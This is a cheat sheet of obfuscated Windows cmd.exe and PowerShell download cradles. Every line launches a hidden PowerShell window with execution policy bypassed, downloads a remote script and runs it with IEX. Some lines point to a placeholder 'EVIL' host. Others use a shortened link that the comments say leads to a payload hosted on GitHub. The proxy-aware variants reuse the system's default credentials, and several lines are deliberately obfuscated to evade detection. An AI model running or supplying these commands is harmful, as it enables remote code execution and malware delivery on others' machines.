# Not proxy aware download cradles, which can be executed in a Windows Command Shell (cmd.exe)  
# Windows Command Shell download cradles, not proxy aware ligthly obfuscated 
cmd> c:\WInDowS\sySTEM32\cmD.eXE   /c  PoWErSheLl  -nopROfi  -EXe  byPAsS  -wiNDOwsTy  HIDdEN -cOMMA  "IEX (New-Object Net.Webclient).downloadstring(\"http://EVIL/payload.ps1\")"
cmd> PoWErSheLl  -nopROfi  -EXe  byPAsS  -wiNdOwsTy  HIDdEN -cOMMA  "IEX (New-Object Net.Webclient).downloadstring(\"http://EVIL/payload.ps1\")"

# Windows Command Shell download cradles, not proxy aware obfuscated
cmd> c:\wiNdoWs\sysTEM32\CmD  /c  pOWeRsheLl -WiNDOW  HIddEN -eXECUTI  BYpaSS  -nop  -CoMmanD   "(New-Object Net.WebClient).DownloadString('http://EVIL/payload.ps1')|.( ([String]''.Chars)[15,18,19]-Join'')"
cmd> pOWeRshell -WiNDOW  HIddEN -eXECUTI  BYpaSS  -nop  -CoMmanD   "(New-Object Net.WebClient).DownloadString('http://EVIL/payload.ps1')|.( ([String]''.Chars)[15,18,19]-Join'')"


# Proxy aware download cradles, which can be executed in a Windows Command Shell (cmd.exe)  
# Info: I use a shortcut link to the raw link from your hosted payload on Github
# For example, https://cutt.ly/syFzILH directs to the raw link of hosted payload on github

# Windows Command Shell download cradles, proxy aware ligthly obfuscated 
cmd> c:\wInDOwS\sysTem32\CmD   /cPowErShell -wINdowstYL  Hi  -nop -eXecU ByPAss -COm    "$c=new-object net.webclient;$c.proxy=[Net.WebRequest]::GetSystemWebProxy();$c.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;iex $c.downloadstring(\"https://cutt.ly/syFzILH\")"
cmd> PowErShell -wINdOwstYL  Hi  -nop -eXecU BYpAss -COm    "$c=new-object net.webclient;$c.proxy=[Net.WebRequest]::GetSystemWebProxy();$c.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;iex $c.downloadstring(\"https://cutt.ly/syFzILH\")"

# Windows Command Shell download cradles, proxy aware heavy obfuscated 
cmd> C:\WINdOWS\SySteM32\CmD.EXe  /cpOWershEll  -eXecut byPaSS -Noprof  -w  H -Co    "$c=new-object net.webclient;$c.proxy=[Net.WebRequest]::GetSystemWebProxy();$c.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;`i`e`x $c.downloadstring(\"ht\"+\"tps://cutt.ly/syFzILH\")"
cmd> poWershELl -eXecUT byPAss -WINDo  1  -nOpR  -coMm  "& ((vARiaBlE '*mdr*').Name[3,11,2]-JoiN'') ((('{2}c=new-obj'+'ect ne'+'t.'+'webclient;{2'+'}'+'c.p'+'roxy='+'[Net'+'.'+'WebR'+'equest]::'+'GetS'+'yst'+'emWebP'+'ro'+'x'+'y();{'+'2}c'+'.Pr'+'oxy.Cre'+'dentials=[Net'+'.Cr'+'edentialC'+'ache]::D'+'e'+'fau'+'l'+'tCredenti'+'als'+';{0}i{0}e'+'{0}x {'+'2}c.downl'+'oa'+'ds'+'t'+'ring({1}ht{1}+{1'+'}t'+'ps'+':'+'/'+'/'+'cutt.ly/syFzIL'+'H{1})') -F  [cHAR]96,[cHAR]34,[cHAR]36))"
